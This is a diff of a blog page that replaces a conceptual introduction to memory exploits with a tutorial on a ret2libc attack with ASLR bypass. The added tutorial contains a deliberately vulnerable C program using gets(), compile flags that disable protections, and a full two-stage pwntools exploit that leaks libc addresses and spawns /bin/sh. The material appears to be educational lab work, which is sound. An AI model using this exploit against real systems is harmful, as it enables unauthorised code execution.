@@ -3,202 +3,133 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MEMORY-EXPLOITS(1)</title>
-
+    <title>RET2LIBC-ASLR-BYPASS(1)</title>
     <link rel="stylesheet" href="../styles.css">
-
-    <!-- Highlight.js CSS -->
+        <!-- Highlight.js CSS -->
     <link rel="stylesheet" href="https://unpkg.com/@highlightjs/cdn-assets@11.7.0/styles/default.min.css" />
-
 </head>
 <body>
 
 <div class="header">
-    <h1>MEMORY-EXPLOITS(1)</h1>
+    <h1>RET2LIBC-ASLR-BYPASS(1)</h1>
     <nav><a href="../index.html">home</a> <a href="../blog.html">posts</a></nav>
 </div>
 
 <div class="article-header">
-    <div class="article-meta">2026-02-13 | exploitation | 10 min read</div>
-    <h1 class="article-title">INTRODUCTION TO MEMORY EXPLOITS FOR BEGINNERS</h1>
+    <div class="article-meta">2024-02-10 | Exploit Development | 12 min read</div>
+    <h1 class="article-title">Return-to-Library (ret2libc) Attack with ASLR Bypass</h1>
 </div>
 
 <h2>SYNOPSIS</h2>
 <p>
-Memory exploitation without the unnecessary mystique — just the fundamentals 
-you actually need to understand what’s happening.
+Exploit Type: Return-to-Library (ret2libc) Attack with ASLR Bypass. This article explores sophisticated techniques for bypassing Address Space Layout Randomization (ASLR) using return-to-library exploits.
 </p>
 
 <h2>DESCRIPTION</h2>
 <p>
-Memory exploitation has a reputation for being complicated, obscure, and 
-borderline magical.
+In the ever-evolving landscape of cybersecurity, understanding both offensive and defensive techniques is crucial for those in the field. In this article, we will delve into a sophisticated attack vector known as the return-to-library (ret2libc) exploit and focus on a particularly challenging aspect — bypassing Address Space Layout Randomization (ASLR). ASLR is a modern security mechanism that randomizes memory addresses, making it significantly more complex for attackers to predict and target specific memory locations. However, skilled adversaries can devise methods to circumvent ASLR, a topic we'll explore in detail.
 </p>
 
+<h3>Understanding the Vulnerable Code</h3>
 <p>
-In reality, it's mostly about one thing:
+To illustrate the intricacies of ASLR bypass, we will utilize a custom C program containing a well-known vulnerability — a buffer overflow. The code is as follows:
 </p>
 
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+int main() {
+    char n[10];
+    puts("Enter data ");
+    gets(n);
+    return 0;
+}</code></pre>
+
 <p>
-<strong>Programs trusting memory they shouldn’t trust.</strong>
+The vulnerability arises from the use of the gets function, which lacks input size verification, enabling us to overwrite the return address. We will compile this code with specific options to disable security mechanisms.
 </p>
 
+<pre><code>gcc main.c -o main -fno-stack-protector -no-pie</code></pre>
+
 <p>
-When that trust breaks, weird things start happening — crashes, corrupted 
-data, unexpected behavior. Exploitation is simply learning how to steer that 
-weirdness.
+This compilation command generates an executable named 'main' while disabling stack protection and the Position Independent Executable (PIE) feature, streamlining the exploitation process.
 </p>
 
-<h2>WHY MEMORY BUGS EXIST</h2>
+<h3>Crafting the Exploit</h3>
 <p>
-At low levels, nothing automatically protects you from mistakes.
+To construct an exploit capable of bypassing ASLR, we will leverage the powerful Python-based pwntools library, which simplifies payload creation and transmission for various exploitation scenarios.
 </p>
 
-<ul>
-    <li>Write past a buffer → memory corruption</li>
-    <li>Use freed memory → undefined behavior</li>
-    <li>Trust user input → chaos</li>
-</ul>
+<pre><code class="language-python">from pwn import *
+elf = context.binary = ELF('./main', checksec=False)
+context.log_level = 'error'
+# Essential Gadgets
+pop_rdi = pack(0x00000000004011bb)
+# Stage 1
+payload = cyclic(18) + pop_rdi + pack(elf.got.puts) + pack(elf.plt.puts)
+payload += pop_rdi + pack(elf.got.gets) + pack(elf.plt.puts) + pack(elf.sym.main)
+io = process()
+io.recvuntil(b"data")
+io.recv()
+io.sendline(payload)
+list_addr = io.recv().split(b"\n")
+Puts_address = hex(unpack(list_addr[0], 'all'))
+Gets_address = hex(unpack(list_addr[1], 'all'))
+print(f"Puts Address {Puts_address}")
+print(f"Gets Address {Gets_address}")
+# Deriving the Libc Base Address
+libc_base_addr = hex(int(Puts_address, 16) - int(0x0000000000072230))
+print(f"Libc Base Address {libc_base_addr}")
+# Calculating the System Address
+system_addr = int(libc_base_addr, 16) + int(0x45e50)
+print(f"System Address {system_addr}")
+# Determining the /bin/sh Address
+bin_sh = int(libc_base_addr, 16) + int(0x195152)
+print(f"/bin/sh Address {bin_sh}")
+# Stage 2
+payload2 = cyclic(18) + pop_rdi + pack(bin_sh) + pack(system_addr)
+io.sendline(payload2)
+io.interactive()</code></pre>
 
 <p>
-The CPU doesn’t care about programmer intentions.
+This Python script serves as the heart of our ASLR bypass exploit and consists of two primary stages:
 </p>
 
-<h2>CLASSIC EXAMPLE — BUFFER OVERFLOW</h2>
-
-<pre><code class="language-cpp">
-void vulnerable() {
-    char buffer[16];
-    gets(buffer);   // unsafe
-}
-</code></pre>
-
+<h3>Stage 1: Extracting Critical Addresses</h3>
 <p>
-Simple bug.
+In this initial stage, we build a payload to extract the addresses of crucial functions, namely puts and gets, from the Global Offset Table (GOT). These addresses are essential for calculating the base address of the C library.
 </p>
 
+<h3>Stage 2: Payload Execution</h3>
 <p>
-If input exceeds 16 bytes, the program starts overwriting adjacent memory.
-Not random memory — very specific memory.
+Having determined the base address of the C library, we design a second payload to execute /bin/sh using the system function.
 </p>
 
+<h2>EXAMPLES</h2>
 <p>
-Depending on layout, this might corrupt:
-</p>
-
-<ul>
-    <li>Saved registers</li>
-    <li>Return addresses</li>
-    <li>Control structures</li>
-</ul>
-
-<p>
-Once control data is overwritten, execution flow becomes negotiable.
-</p>
-
-<h2>WHAT EXPLOITATION REALLY IS</h2>
-<p>
-Forget Hollywood definitions.
-</p>
-
-<p>
-Exploitation is forcing a program into executing unintended behavior by 
-manipulating memory state.
-</p>
-
-<p>
-No magic. Just logic + patience.
-</p>
-
-<h2>COMMON MEMORY BUG TYPES</h2>
-
-<ul>
-    <li><strong>Buffer Overflow</strong> – Writing beyond boundaries</li>
-    <li><strong>Heap Overflow</strong> – Corrupting heap structures</li>
-    <li><strong>Use-After-Free</strong> – Accessing invalid memory</li>
-    <li><strong>Double Free</strong> – Breaking allocator assumptions</li>
-    <li><strong>Out-of-Bounds Read</strong> – Leaking sensitive data</li>
-</ul>
-
-<p>
-Different mechanics, same root problem: memory misuse.
-</p>
-
-<h2>THE RIGHT WAY TO THINK</h2>
-<p>
-Beginners often focus on payload tricks.
-</p>
-
-<p>
-Better approach:
-</p>
-
-<ul>
-    <li>What assumptions does the program make?</li>
-    <li>What happens when those assumptions fail?</li>
-    <li>What memory influences execution?</li>
-</ul>
-
-<p>
-Memory exploitation is mostly pattern recognition.
-</p>
-
-<h2>MODERN DEFENSES</h2>
-
-<ul>
-    <li>ASLR</li>
-    <li>DEP / NX</li>
-    <li>Stack Canaries</li>
-    <li>Heap Hardening</li>
-</ul>
-
-<p>
-These don’t stop exploitation — they punish sloppy exploitation.
-</p>
-
-<h2>WHAT TO LEARN FIRST</h2>
-
-<ul>
-    <li>Stack vs Heap layout</li>
-    <li>Function call mechanics</li>
-    <li>Debugger workflows</li>
-    <li>Crash analysis</li>
-    <li>Allocator behavior</li>
-</ul>
-
-<p>
-Hands-on debugging beats theory every time.
+After saving the script and compiling the vulnerable program, you can execute the exploit. The script will obtain the requisite addresses and execute /bin/sh, granting full control over the system.
 </p>
 
 <h2>NOTES</h2>
 <p>
-Crashes are not failures.
-</p>
-
-<p>
-Crashes are signals.
-</p>
-
-<p>
-Every crash tells you something about memory layout, boundaries, or program 
-assumptions.
+This article has provided an in-depth exploration of a ret2libc exploit with ASLR bypass, shedding light on the underlying techniques. It is crucial to familiarize oneself with these methodologies to bolster defense mechanisms against potential threats. However, always adhere to ethical standards in the realm of cybersecurity. Apply these skills responsibly and solely on systems where proper authorization has been granted. In the world of security, ethical behavior is paramount.
 </p>
 
 <h2>SEE ALSO</h2>
 <p>
-buffer overflows, heap internals, calling conventions, debugger workflows
+References to related articles or resources.
 </p>
 
 <div class="footer">
     <p><a href="../blog.html">back to posts</a></p>
 </div>
 
+
 <!-- Highlight.js JS -->
 <script src="https://unpkg.com/@highlightjs/cdn-assets@11.7.0/highlight.min.js"></script>
 
 <!-- Language Support -->
 <script src="https://unpkg.com/@highlightjs/cdn-assets@11.7.0/languages/cpp.min.js"></script>
-<script src="https://unpkg.com/@highlightjs/cdn-assets@11.7.0/languages/javascript.min.js"></script>
+<script src="https://unpkg.com/@highlightjs/cdn-assets@11.7.0/languages/c.min.js"></script>
+<script src="https://unpkg.com/@highlightjs/cdn-assets@11.7.0/languages/python.min.js"></script>
 
 <script>
 document.addEventListener('DOMContentLoaded', () => {
